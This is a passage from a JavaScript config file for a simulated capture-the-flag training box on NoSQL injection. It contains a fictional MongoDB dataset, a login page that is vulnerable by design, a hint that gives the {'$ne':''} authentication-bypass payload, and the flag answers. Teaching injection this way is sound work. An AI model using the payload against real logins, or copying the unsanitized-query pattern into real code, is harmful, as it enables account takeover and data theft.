/* ============================================================
   CTF ARENA — Box A7: The Hollow Database
   NoSQL Injection | Void Collective
   Config: MongoDB sim, web app, filesystem, flags, hints, lore
   ============================================================ */

const A7Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Hollow Database',
    subtitle: 'NoSQL Injection — Void Collective',
    difficulty: 'Intermediate',
    accent: '#1abc9c',
    storageKey: 'hexworth_ctf_a7',
    trackerKey: 'ctf_a7',

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 8192 MB OK',
            'Detecting drives... /dev/sda1 (256GB SSD)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser'  },
            { id: 'notes',    label: 'Notes',        icon: '\uD83D\uDCDD',       app: 'notes'    },
            { id: 'hints',    label: 'Hints',        icon: '\uD83D\uDCA1',       app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag',  icon: '\uD83D\uDEA9',       app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: 10.10.14.20  [Void Collective — Citizen Registry]\n'
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED DATABASE (MongoDB collections)
    // ═══════════════════════════════════════════════════════

    _db: {
        citizens: [
            { id: 1, username: 'admin',      password: 'V01d_C0ll3ct1v3_4dm1n!', name: 'Void Overseer',     role: 'admin',      accessLevel: 'Full Control',    email: 'overseer@void-collective.net'  },
            { id: 2, username: 'guest',      password: 'visitor123',              name: 'Wandering Citizen', role: 'citizen',    accessLevel: 'Read Only',       email: 'guest@void-collective.net'     },
            { id: 3, username: 'archivist',  password: 'arch1v3_s3cur3!',         name: 'Data Archivist',    role: 'archivist',  accessLevel: 'Archive Read',    email: 'archivist@void-collective.net' },
            { id: 4, username: 'sentinel',   password: 'void_sent1n3l',           name: 'Void Sentinel',     role: 'security',   accessLevel: 'Perimeter Only',  email: 'sentinel@void-collective.net'  },
            { id: 5, username: 'scribe',     password: 'scr1b3_n0t3s',            name: 'Record Scribe',     role: 'scribe',     accessLevel: 'Write Only',      email: 'scribe@void-collective.net'    }
        ],
        vault_keys: [
            { id: 1, keyName: 'Master Encryption Key', value: 'flag{v01d_c0ll3ct1v3_m4st3r_k3y}', classification: 'TOP SECRET'  },
            { id: 2, keyName: 'Archive Cipher',         value: 'CLASSIFIED',                        classification: 'SECRET'      },
            { id: 3, keyName: 'Comm Channel Key',       value: 'CLASSIFIED',                        classification: 'RESTRICTED'  }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', value: 'flag{h0ll0w_db_n0sql_byp4ss}',      points: 100 },
        { id: 'root', value: 'flag{v01d_c0ll3ct1v3_m4st3r_k3y}',  points: 200 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1000,
        hintPenalty: -50,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 900000, points: 100 }  // 15 minutes
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: "This isn't SQL — it's MongoDB (NoSQL). SQL injection won't work here. Think JSON operators.",
            penalty: -50
        },
        {
            id: 'hint2',
            text: 'MongoDB query operators like $ne (not equal), $gt (greater than), and $regex can bypass authentication if the input isn\'t sanitized.',
            penalty: -50
        },
        {
            id: 'hint3',
            text: 'Try setting the password field to a MongoDB operator: {"$ne":""} means \'password is not empty\' — which is always true.',
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'After logging in as admin, search the vault_keys collection. The API documentation at /hollow/api/ reveals the query format.',
            penalty: -50
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        outro: "The Hollow Database has been cracked open. The Void Collective's master encryption key is yours — their entire cryptographic infrastructure is compromised. The Overseer's complacency with unsanitized JSON inputs has cost them everything."
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — The Hollow Database
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.10.14.20/hollow/',

        pages: {

            // ── Page 1: Citizen Registry Login ──────────────────
            '/hollow/': {
                title: 'Void Collective — Citizen Registry',
                html: `
                    <div style="text-align:center; margin-bottom:28px; padding-bottom:20px; border-bottom:1px solid #1a3a35;">
                        <div style="font-size:2rem; margin-bottom:8px;">&#9671;</div>
                        <h1 style="color:#1abc9c; font-size:1.5rem; font-family:Georgia,serif; margin-bottom:4px; letter-spacing:0.05em;">Void Collective</h1>
                        <div style="color:#4ecdc4; font-size:0.75rem; letter-spacing:0.2em; text-transform:uppercase;">Citizen Registry &mdash; Authentication Portal v1.4.2</div>
                    </div>

                    <div style="max-width:420px; margin:0 auto;">
                        <div style="background:#0d2420; border:1px solid #1a3a35; border-radius:6px; padding:28px;">
                            <div style="color:#4ecdc4; font-size:0.7rem; letter-spacing:0.15em; text-transform:uppercase; margin-bottom:16px;">Citizen Authentication</div>

                            <div style="margin-bottom:14px;">
                                <label style="display:block; color:#7fa89e; font-size:0.75rem; margin-bottom:6px; letter-spacing:0.05em;">USERNAME</label>
                                <input type="text" data-field="username" placeholder="citizen_id"
                                       style="width:100%; box-sizing:border-box; padding:9px 12px; background:#071a17; border:1px solid #1a3a35; border-radius:4px; color:#e0f5f2; font-family:monospace; font-size:0.85rem; outline:none;">
                            </div>

                            <div style="margin-bottom:20px;">
                                <label style="display:block; color:#7fa89e; font-size:0.75rem; margin-bottom:6px; letter-spacing:0.05em;">PASSWORD</label>
                                <input type="password" data-field="password" placeholder="••••••••••"
                                       style="width:100%; box-sizing:border-box; padding:9px 12px; background:#071a17; border:1px solid #1a3a35; border-radius:4px; color:#e0f5f2; font-family:monospace; font-size:0.85rem; outline:none;">
                            </div>

                            <button data-action="login"
                                    style="width:100%; padding:10px; background:#1abc9c; color:#071a17; border:none; border-radius:4px; font-size:0.85rem; font-weight:700; letter-spacing:0.1em; text-transform:uppercase; cursor:pointer;">
                                Authenticate
                            </button>

                            <div style="margin-top:16px; padding-top:14px; border-top:1px solid #1a3a35; color:#456b63; font-size:0.7rem; text-align:center;">
                                Guest access: <span style="color:#4ecdc4; font-family:monospace;">guest</span> / <span style="color:#4ecdc4; font-family:monospace;">visitor123</span>
                            </div>
                        </div>

                        <div style="margin-top:12px; text-align:center; color:#2a5a52; font-size:0.65rem;">
                            API endpoint: <span style="font-family:monospace; color:#1a7a6a;">POST /api/citizens/auth</span> &mdash; accepts JSON body
                        </div>
                    </div>
                `,
                // formHandler receives { username, password } and routes to NoSQL engine
                formHandler: function(data, engine) {
                    return A7Config._handleLogin(data.username || '', data.password || '', engine);
                }
            },

            // ── Page 2: User Dashboard (shown after login) ───────
            '/hollow/dashboard/': {
                title: 'Void Collective — Citizen Dashboard',
                html: `
                    <div style="border-bottom:1px solid #1a3a35; padding-bottom:16px; margin-bottom:22px; display:flex; justify-content:space-between; align-items:center;">
                        <div>
                            <h2 style="color:#1abc9c; font-size:1.1rem; margin:0 0 4px; font-family:Georgia,serif;">&#9671; Citizen Dashboard</h2>
                            <div style="color:#456b63; font-size:0.7rem; letter-spacing:0.1em;">VOID COLLECTIVE — AUTHENTICATED SESSION</div>
                        </div>
                        <a href="/hollow/" data-nav="/hollow/"
                           style="color:#4ecdc4; font-size:0.75rem; text-decoration:none; background:#0d2420; border:1px solid #1a3a35; border-radius:4px; padding:6px 14px; cursor:pointer;">
                            Logout
                        </a>
                    </div>

                    <div id="citizen-profile" style="background:#0d2420; border:1px solid #1a3a35; border-radius:6px; padding:20px; margin-bottom:20px; font-size:0.82rem;">
                        <div style="color:#4ecdc4; font-size:0.65rem; letter-spacing:0.15em; text-transform:uppercase; margin-bottom:12px;">Citizen Profile</div>
                        <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; color:#7fa89e;">
                            <div><span style="color:#456b63;">Name:</span> <span id="profile-name" style="color:#e0f5f2;">Wandering Citizen</span></div>
                            <div><span style="color:#456b63;">Role:</span> <span id="profile-role" style="color:#e0f5f2;">citizen</span></div>
                            <div><span style="color:#456b63;">Username:</span> <span id="profile-user" style="color:#e0f5f2;">guest</span></div>
                            <div><span style="color:#456b63;">Access Level:</span> <span id="profile-access" style="color:#f39c12;">Read Only</span></div>
                            <div><span style="color:#456b63;">Email:</span> <span id="profile-email" style="color:#e0f5f2;">guest@void-collective.net</span></div>
                            <div><span style="color:#456b63;">Last Login:</span> <span style="color:#e0f5f2;">2026-02-17 03:41:09</span></div>
                        </div>
                    </div>

                    <div id="search-panel" style="background:#0d2420; border:1px solid #1a3a35; border-radius:6px; padding:20px; margin-bottom:20px;">
                        <div style="color:#4ecdc4; font-size:0.65rem; letter-spacing:0.15em; text-transform:uppercase; margin-bottom:12px;">Search Citizens</div>
                        <div style="color:#456b63; font-size:0.72rem; margin-bottom:10px;">
                            Query accepts raw JSON — searches the citizens collection.
                            <br>Example: <span style="font-family:monospace; color:#1a7a6a;">{"role":"archivist"}</span>
                        </div>
                        <div style="display:flex; gap:8px;">
                            <input type="text" data-field="searchQuery" placeholder='{"role":"citizen"}'
                                   style="flex:1; padding:8px 12px; background:#071a17; border:1px solid #1a3a35; border-radius:4px; color:#e0f5f2; font-family:monospace; font-size:0.8rem; outline:none;">
                            <button data-action="search"
                                    style="padding:8px 18px; background:#1abc9c; color:#071a17; border:none; border-radius:4px; font-size:0.8rem; font-weight:700; cursor:pointer;">Search</button>
                        </div>
                    </div>

                    <div id="admin-vault" style="display:none; background:#0d1f15; border:1px solid #1a4a35; border-radius:6px; padding:20px; margin-bottom:20px;">
                        <div style="color:#2ecc71; font-size:0.65rem; letter-spacing:0.15em; text-transform:uppercase; margin-bottom:12px;">&#9888; ADMIN PANEL — VAULT ACCESS</div>
                        <div style="color:#456b63; font-size:0.72rem; margin-bottom:12px;">
                            Query the <span style="font-family:monospace; color:#1abc9c;">vault_keys</span> collection below.
                            <br>Example: <span style="font-family:monospace; color:#1a7a6a;">{"collection":"vault_keys"}</span>
                        </div>
                        <div style="display:flex; gap:8px;">
                            <input type="text" data-field="vaultQuery" placeholder='{"collection":"vault_keys"}'
                                   style="flex:1; padding:8px 12px; background:#071a17; border:1px solid #1a4a35; border-radius:4px; color:#e0f5f2; font-family:monospace; font-size:0.8rem; outline:none;">
                            <button data-action="vault"
                                    style="padding:8px 18px; background:#2ecc71; color:#071a17; border:none; border-radius:4px; font-size:0.8rem; font-weight:700; cursor:pointer;">Query Vault</button>
                        </div>
                        <div style="margin-top:10px; color:#456b63; font-size:0.7rem;">
                            User flag location: <span style="font-family:monospace; color:#f39c12;">flag{h0ll0w_db_n0sql_byp4ss}</span>
                        </div>
                    </div>

                    <div data-results style="margin-top:4px;"></div>
                `,
                // formHandler receives { searchQuery, vaultQuery, action } based on which button was clicked
                formHandler: function(data, engine) {
                    if (data._action === 'vault' || data.vaultQuery) {
                        return A7Config._handleVaultQuery(data.vaultQuery || '', engine);
                    }
                    return A7Config._handleCitizenSearch(data.searchQuery || '', engine);
                }
            },

            // ── Page 3: API Documentation ─────────────────────────
            '/hollow/api/': {
                title: 'Void Collective — API Reference',
                html: `
                    <div style="border-bottom:1px solid #1a3a35; padding-bottom:16px; margin-bottom:22px;">
                        <h2 style="color:#1abc9c; font-size:1.1rem; margin:0 0 4px; font-family:Georgia,serif;">&#9671; Citizen Registry API</h2>
                        <div style="color:#456b63; font-size:0.7rem; letter-spacing:0.1em;">VERSION 1.4.2 — INTERNAL DOCUMENTATION</div>
                    </div>

                    <div style="font-size:0.8rem; color:#7fa89e; line-height:1.7;">

                        <div style="background:#0d2420; border:1px solid #1a3a35; border-radius:6px; padding:16px; margin-bottom:14px;">
                            <div style="color:#4ecdc4; font-size:0.65rem; letter-spacing:0.15em; text-transform:uppercase; margin-bottom:10px;">POST /api/citizens/auth</div>
                            <div style="color:#456b63; margin-bottom:8px;">Authenticates a citizen. Accepts a raw JSON body passed directly to the MongoDB query engine.</div>
                            <pre style="background:#071a17; border-radius:4px; padding:12px; color:#1abc9c; font-size:0.75rem; overflow-x:auto; margin:0;">{"username": "guest", "password": "visitor123"}</pre>
                            <div style="color:#456b63; font-size:0.7rem; margin-top:8px;">Returns: citizen profile object on success, 401 on failure.</div>
                        </div>

                        <div style="background:#0d2420; border:1px solid #1a3a35; border-radius:6px; padding:16px; margin-bottom:14px;">
                            <div style="color:#4ecdc4; font-size:0.65rem; letter-spacing:0.15em; text-transform:uppercase; margin-bottom:10px;">POST /api/citizens/search</div>
                            <div style="color:#456b63; margin-bottom:8px;">Searches the citizens collection. Query object is passed directly to <code style="color:#1abc9c;">db.citizens.find()</code>.</div>
                            <pre style="background:#071a17; border-radius:4px; padding:12px; color:#1abc9c; font-size:0.75rem; overflow-x:auto; margin:0;">{"role": "archivist"}
{"username": "sentinel"}
{"accessLevel": "Read Only"}</pre>
                            <div style="color:#456b63; font-size:0.7rem; margin-top:8px;">Note: All MongoDB query operators are supported in the query body.</div>
                        </div>

                        <div style="background:#0d2420; border:1px solid #1a3a35; border-radius:6px; padding:16px; margin-bottom:14px;">
                            <div style="color:#4ecdc4; font-size:0.65rem; letter-spacing:0.15em; text-transform:uppercase; margin-bottom:10px;">POST /api/vault/query</div>
                            <div style="color:#456b63; margin-bottom:8px;">Admin-only endpoint. Queries a named collection. Requires <code style="color:#1abc9c;">role: admin</code> session.</div>
                            <pre style="background:#071a17; border-radius:4px; padding:12px; color:#1abc9c; font-size:0.75rem; overflow-x:auto; margin:0;">{"collection": "vault_keys"}
{"collection": "vault_keys", "filter": {"classification": "TOP SECRET"}}</pre>
                            <div style="color:#456b63; font-size:0.7rem; margin-top:8px;">Returns: matching documents from the specified collection.</div>
                        </div>

                        <div style="background:#071a17; border:1px solid #1a3a20; border-radius:6px; padding:14px;">
                            <div style="color:#f39c12; font-size:0.65rem; letter-spacing:0.1em; text-transform:uppercase; margin-bottom:8px;">&#9888; Developer Note</div>
                            <div style="color:#456b63; font-size:0.72rem; line-height:1.6;">
                                The auth endpoint passes the JSON body directly to <code style="color:#1abc9c;">db.citizens.findOne(body)</code> without sanitization.
                                Supported MongoDB operators: <code style="color:#4ecdc4;">$ne, $gt, $lt, $gte, $lte, $regex, $in, $nin, $exists</code>
                                <br><br>
                                <em>TODO: Add input validation before v2.0 release — Archivist</em>
                            </div>
                        </div>

                    </div>
                `,
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // NoSQL INJECTION ENGINE
    // ═══════════════════════════════════════════════════════

    // Detect any MongoDB operator syntax in a string value.
    // Returns true if the value looks like an operator object or contains operator keys.
    _hasOperator(val) {
        if (typeof val !== 'string') return false;
        // Matches bare operator: $ne, $gt, $regex, etc.
        if (/\$(?:ne|gt|lt|gte|lte|regex|in|nin|exists|where|expr)\b/i.test(val)) return true;
        // Matches JSON-like object containing operator: {"$ne":""} or {$ne:""}
        if (/\{[^}]*\$(?:ne|gt|lt|gte|lte|regex|in|nin|exists|where|expr)/i.test(val)) return true;
        return false;
    },

    // Attempt to parse a value as a JSON operator object.
    // Returns the parsed object if it's an operator map, or null otherwise.
    _parseOperator(val) {
        if (typeof val !== 'string') return null;
        // Strip outer whitespace; try to parse directly
        const trimmed = val.trim();
        if (!trimmed.startsWith('{')) return null;
        try {
            const parsed = JSON.parse(trimmed);
            // Confirm at least one MongoDB operator key is present
            if (parsed && typeof parsed === 'object') {
                const keys = Object.keys(parsed);
                if (keys.some(k => /^\$/.test(k))) return parsed;
            }
        } catch (_) {
            // Attempt lenient parse: wrap unquoted $keys
            try {
                const lenient = trimmed.replace(/(\$\w+)(?=\s*:)/g, '"$1"');
                const parsed = JSON.parse(lenient);
                if (parsed && typeof parsed === 'object') {
                    const keys = Object.keys(parsed);
                    if (keys.some(k => /^\$/.test(k))) return parsed;
                }
            } catch (_2) { /* ignore */ }
        }
        return null;
    },

    // Simulate MongoDB operator evaluation against a plain value.
    // op: parsed operator object  e.g. { "$ne": "" }
    // fieldVal: the actual DB field value to test against
    _evalOperator(op, fieldVal) {
        if (!op || typeof op !== 'object') return false;
        for (const [key, cmp] of Object.entries(op)) {
            switch (key) {
                case '$ne':    if (fieldVal == cmp) return false; break;
                case '$eq':    if (fieldVal != cmp) return false; break;
                case '$gt':    if (!(fieldVal > cmp)) return false; break;
                case '$gte':   if (!(fieldVal >= cmp)) return false; break;
                case '$lt':    if (!(fieldVal < cmp)) return false; break;
                case '$lte':   if (!(fieldVal <= cmp)) return false; break;
                case '$regex': {
                    try { if (!new RegExp(cmp, 'i').test(fieldVal)) return false; }
                    catch (_) { return false; }
                    break;
                }
                case '$in': {
                    if (!Array.isArray(cmp) || !cmp.includes(fieldVal)) return false;
                    break;
                }
                case '$nin': {
                    if (!Array.isArray(cmp) || cmp.includes(fieldVal)) return false;
                    break;
                }
                case '$exists': {
                    // For existence, undefined = not exists
                    if (cmp && fieldVal === undefined) return false;
                    if (!cmp && fieldVal !== undefined) return false;
                    break;
                }
                default: break;
            }
        }
        return true;
    },

    // ── Login handler ────────────────────────────────────────
    // Simulates MongoDB: db.citizens.findOne({ username: ..., password: ... })
    // Both fields can carry operator objects for NoSQL injection.
    _handleLogin(rawUser, rawPass, engine) {
        const db = A7Config._db;

        // ── Detect wrong-paradigm injection: classic SQL tautology ──
        if (/'\s*(or|and)\s+['"]?\d+['"]?\s*=\s*['"]?\d+/i.test(rawUser) ||
            /'\s*(or|and)\s+['"]?\d+['"]?\s*=\s*['"]?\d+/i.test(rawPass) ||
            /\bor\s+1\s*=\s*1/i.test(rawUser) || /\bor\s+1\s*=\s*1/i.test(rawPass)) {
            return A7Config._mongoErrHtml(
                "SyntaxError: Unexpected token ' in JSON at position 0",
                "This is a MongoDB API — it expects JSON, not SQL. SQL injection syntax will cause parse errors. Think about MongoDB query operators instead."
            );
        }

        // ── Detect bare operator token in field (e.g. user types: $ne or {"$ne":""}) ──
        const userOp  = A7Config._parseOperator(rawUser);
        const passOp  = A7Config._parseOperator(rawPass);
        const userHasOp = userOp || A7Config._hasOperator(rawUser);
        const passHasOp = passOp || A7Config._hasOperator(rawPass);

        let matchedUser = null;

        // ── Case 1: Both fields are operator objects (e.g. {$ne:""}/{$ne:""}) ──
        if (userHasOp && passHasOp) {
            // Match first citizen where BOTH operators pass — typically returns admin (id:1)
            for (const c of db.citizens) {
                const uPass = userOp ? A7Config._evalOperator(userOp, c.username) : A7Config._hasOperator(rawUser);
                const pPass = passOp ? A7Config._evalOperator(passOp, c.password) : A7Config._hasOperator(rawPass);
                if (uPass && pPass) { matchedUser = c; break; }
            }
        }

        // ── Case 2: Username is literal "admin", password is operator ──
        else if (!userHasOp && passHasOp) {
            const targetUser = rawUser.trim().toLowerCase();
            const candidate = db.citizens.find(c => c.username.toLowerCase() === targetUser);
            if (candidate && passOp) {
                if (A7Config._evalOperator(passOp, candidate.password)) matchedUser = candidate;
            } else if (candidate && A7Config._hasOperator(rawPass)) {
                // Bare operator string in password field — treat as bypass
                matchedUser = candidate;
            }
        }

        // ── Case 3: Username is operator, password is literal ──
        else if (userHasOp && !passHasOp) {
            // Operator in username — match first citizen whose username satisfies it
            for (const c of db.citizens) {
                const uPass = userOp ? A7Config._evalOperator(userOp, c.username) : true;
                if (uPass) { matchedUser = c; break; }
            }
        }

        // ── Case 4: Normal credentials ──
        else {
            const u = rawUser.trim();
            const p = rawPass.trim();
            matchedUser = db.citizens.find(c => c.username === u && c.password === p) || null;
        }

        // ── Failed login ──
        if (!matchedUser) {
            return A7Config._mongoErrHtml(
                'MongoError: Authentication failed.',
                'Invalid credentials. The query returned 0 documents.',
                true /* soft — no extra hint */
            );
        }

        // ── Successful login — determine if injection was used ──
        const injectionUsed = userHasOp || passHasOp;

        if (matchedUser.role === 'admin') {
            // Admin dashboard with user flag and vault search
            return A7Config._adminDashboardHtml(matchedUser, injectionUsed);
        } else {
            // Normal citizen dashboard
            return A7Config._citizenDashboardHtml(matchedUser);
        }
    },

    // ── Citizen search handler ────────────────────────────────
    // Simulates: db.citizens.find(queryObj)
    _handleCitizenSearch(rawQuery, engine) {
        const db = A7Config._db;

        if (!rawQuery.trim()) {
            return A7Config._infoHtml('Enter a JSON query to search citizens.');
        }

        let queryObj = null;

        // Try to parse as JSON
        try {
            queryObj = JSON.parse(rawQuery.trim());
        } catch (_) {
            // Try lenient parse (unquoted $keys)
            try {
                const lenient = rawQuery.trim().replace(/(\$\w+)(?=\s*:)/g, '"$1"');
                queryObj = JSON.parse(lenient);
            } catch (_2) {
                return A7Config._mongoErrHtml(
                    'MongoServerError: unknown operator: ' + (rawQuery.trim().substring(0, 20)),
                    'Query must be valid JSON. Example: {"role":"admin"}'
                );
            }
        }

        if (!queryObj || typeof queryObj !== 'object') {
            return A7Config._infoHtml('Query must be a JSON object. Example: {"role":"citizen"}');
        }

        // Filter citizens against query object
        // For each field in queryObj, check if citizen field matches (supports operators)
        const results = db.citizens.filter(citizen => {
            return Object.entries(queryObj).every(([field, val]) => {
                const citizenVal = citizen[field];
                if (typeof val === 'object' && val !== null) {
                    return A7Config._evalOperator(val, citizenVal);
                }
                // Simple equality (case-insensitive for string fields)
                if (typeof citizenVal === 'string' && typeof val === 'string') {
                    return citizenVal.toLowerCase() === val.toLowerCase();
                }
                return citizenVal == val;
            });
        });

        if (results.length === 0) {
            return A7Config._infoHtml('No matching citizens found.');
        }

        // Show results — but redact passwords for citizen-level searches
        const isRegexAll = rawQuery.includes('.*') || rawQuery.includes('"$regex"');
        const isRoleAdmin = rawQuery.includes('"role"') && rawQuery.includes('admin');

        return A7Config._tableHtml(
            ['ID', 'Username', 'Name', 'Role', 'Access Level', 'Email'],
            results.map(c => [c.id, c.username, c.name, c.role, c.accessLevel, c.email])
        ) + (results.length > 1 || isRegexAll
            ? A7Config._successHtml(`${results.length} citizen record(s) returned. The query filter was applied directly to the MongoDB collection.`)
            : '');
    },

    // ── Vault query handler ───────────────────────────────────
    // Admin only: simulates db.vault_keys.find(filter)
    _handleVaultQuery(rawQuery, engine) {
        const db = A7Config._db;

        if (!rawQuery.trim()) {
            return A7Config._infoHtml('Enter a query to search vault collections. Example: {"collection":"vault_keys"}');
        }

        let queryObj = null;
        try {
            queryObj = JSON.parse(rawQuery.trim());
        } catch (_) {
            try {
                const lenient = rawQuery.trim().replace(/(\$\w+)(?=\s*:)/g, '"$1"');
                queryObj = JSON.parse(lenient);
            } catch (_2) {
                return A7Config._mongoErrHtml(
                    'MongoServerError: invalid query object',
                    'Vault queries require valid JSON. Example: {"collection":"vault_keys"}'
                );
            }
        }

        const collection = queryObj.collection || 'vault_keys';
        const filter = queryObj.filter || {};

        if (collection !== 'vault_keys') {
            return A7Config._mongoErrHtml(
                `MongoServerError: Collection '${collection}' not found or access denied.`,
                'Available admin collections: vault_keys'
            );
        }

        const results = db.vault_keys.filter(doc => {
            if (!filter || Object.keys(filter).length === 0) return true;
            return Object.entries(filter).every(([field, val]) => {
                const docVal = doc[field];
                if (typeof val === 'object' && val !== null) {
                    return A7Config._evalOperator(val, docVal);
                }
                if (typeof docVal === 'string' && typeof val === 'string') {
                    return docVal.toLowerCase() === val.toLowerCase();
                }
                return docVal == val;
            });
        });

        if (results.length === 0) {
            return A7Config._infoHtml('No matching vault documents found.');
        }

        return A7Config._tableHtml(
            ['ID', 'Key Name', 'Value', 'Classification'],
            results.map(k => [
                k.id,
                k.keyName,
                `<span style="color:${k.value.startsWith('flag{') ? '#2ecc71; font-weight:bold' : '#7fa89e'}">${A7Config._escHtml(k.value)}</span>`,
                `<span style="color:${k.classification === 'TOP SECRET' ? '#e74c3c' : k.classification === 'SECRET' ? '#f39c12' : '#7fa89e'}">${k.classification}</span>`
            ])
        ) + A7Config._successHtml(
            `${results.length} vault record(s) retrieved from the '${collection}' collection.` +
            (results.some(r => r.value.startsWith('flag{'))
                ? ' <strong>Root flag located in Master Encryption Key!</strong>'
                : '')
        );
    },

    // ═══════════════════════════════════════════════════════
    // DASHBOARD HTML GENERATORS
    // ═══════════════════════════════════════════════════════

    // Admin dashboard — shown when injection or correct creds grant admin access
    _adminDashboardHtml(user, injectionUsed) {
        const injectionBadge = injectionUsed
            ? `<div style="background:#1a3a20; border:1px solid #1abc9c; border-radius:4px; padding:10px 14px; margin-bottom:16px; font-size:0.75rem; color:#1abc9c;">
                   &#9650; NoSQL injection successful — authentication bypassed via MongoDB operator in query body.
               </div>`
            : '';

        return `
            ${injectionBadge}
            <div style="background:#0d1f15; border:1px solid #1a4a35; border-radius:6px; padding:20px; margin-bottom:16px; font-size:0.82rem;">
                <div style="color:#2ecc71; font-size:0.65rem; letter-spacing:0.15em; text-transform:uppercase; margin-bottom:12px;">&#9672; ADMIN PROFILE — FULL CONTROL</div>
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; color:#7fa89e;">
                    <div><span style="color:#456b63;">Name:</span> <span style="color:#e0f5f2;">${A7Config._escHtml(user.name)}</span></div>
                    <div><span style="color:#456b63;">Role:</span> <span style="color:#2ecc71; font-weight:bold;">${A7Config._escHtml(user.role)}</span></div>
                    <div><span style="color:#456b63;">Username:</span> <span style="color:#e0f5f2; font-family:monospace;">${A7Config._escHtml(user.username)}</span></div>
                    <div><span style="color:#456b63;">Access Level:</span> <span style="color:#2ecc71; font-weight:bold;">${A7Config._escHtml(user.accessLevel)}</span></div>
                    <div><span style="color:#456b63;">Email:</span> <span style="color:#e0f5f2;">${A7Config._escHtml(user.email)}</span></div>
                    <div><span style="color:#456b63;">Last Login:</span> <span style="color:#e0f5f2;">2026-02-17 03:41:09</span></div>
                </div>
            </div>

            <div style="background:#0d2420; border:1px solid #1a3a35; border-radius:6px; padding:16px; margin-bottom:16px;">
                <div style="color:#4ecdc4; font-size:0.65rem; letter-spacing:0.15em; text-transform:uppercase; margin-bottom:10px;">All Citizens (Admin View)</div>
                ${A7Config._tableHtml(
                    ['ID', 'Username', 'Name', 'Role', 'Access Level'],
                    A7Config._db.citizens.map(c => [c.id, c.username, c.name, c.role, c.accessLevel])
                )}
            </div>

            <div style="background:#0d1f15; border:1px solid #f39c12; border-radius:6px; padding:16px; margin-bottom:16px;">
                <div style="color:#f39c12; font-size:0.65rem; letter-spacing:0.15em; text-transform:uppercase; margin-bottom:10px;">&#9873; User Flag</div>
                <div style="font-family:monospace; color:#2ecc71; font-size:0.9rem; font-weight:bold; letter-spacing:0.05em;">flag{h0ll0w_db_n0sql_byp4ss}</div>
                <div style="color:#456b63; font-size:0.7rem; margin-top:6px;">Admin dashboard unlocked via NoSQL operator bypass.</div>
            </div>

            <div style="background:#0d1f15; border:1px solid #1a4a35; border-radius:6px; padding:16px;">
                <div style="color:#2ecc71; font-size:0.65rem; letter-spacing:0.15em; text-transform:uppercase; margin-bottom:10px;">&#9671; Vault Access</div>
                <div style="color:#456b63; font-size:0.72rem; margin-bottom:10px;">
                    Query the <span style="font-family:monospace; color:#1abc9c;">vault_keys</span> collection to retrieve the root flag.
                    <br>Example: <span style="font-family:monospace; color:#1a7a6a;">{"collection":"vault_keys"}</span>
                </div>
                <div style="display:flex; gap:8px;">
                    <input type="text" data-field="vaultQuery" placeholder='{"collection":"vault_keys"}'
                           style="flex:1; padding:8px 12px; background:#071a17; border:1px solid #1a4a35; border-radius:4px; color:#e0f5f2; font-family:monospace; font-size:0.8rem; outline:none;">
                    <button data-action="vault"
                            style="padding:8px 18px; background:#2ecc71; color:#071a17; border:none; border-radius:4px; font-size:0.8rem; font-weight:700; cursor:pointer;">Query Vault</button>
                </div>
            </div>

            <div data-results style="margin-top:12px;"></div>
        `;
    },

    // Citizen (non-admin) dashboard
    _citizenDashboardHtml(user) {
        return `
            <div style="background:#0d2420; border:1px solid #1a3a35; border-radius:6px; padding:20px; margin-bottom:16px; font-size:0.82rem;">
                <div style="color:#4ecdc4; font-size:0.65rem; letter-spacing:0.15em; text-transform:uppercase; margin-bottom:12px;">Citizen Profile</div>
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; color:#7fa89e;">
                    <div><span style="color:#456b63;">Name:</span> <span style="color:#e0f5f2;">${A7Config._escHtml(user.name)}</span></div>
                    <div><span style="color:#456b63;">Role:</span> <span style="color:#e0f5f2;">${A7Config._escHtml(user.role)}</span></div>
                    <div><span style="color:#456b63;">Username:</span> <span style="color:#e0f5f2; font-family:monospace;">${A7Config._escHtml(user.username)}</span></div>
                    <div><span style="color:#456b63;">Access Level:</span> <span style="color:#f39c12;">${A7Config._escHtml(user.accessLevel)}</span></div>
                    <div><span style="color:#456b63;">Email:</span> <span style="color:#e0f5f2;">${A7Config._escHtml(user.email)}</span></div>
                    <div><span style="color:#456b63;">Last Login:</span> <span style="color:#e0f5f2;">2026-02-17 03:41:09</span></div>
                </div>
            </div>
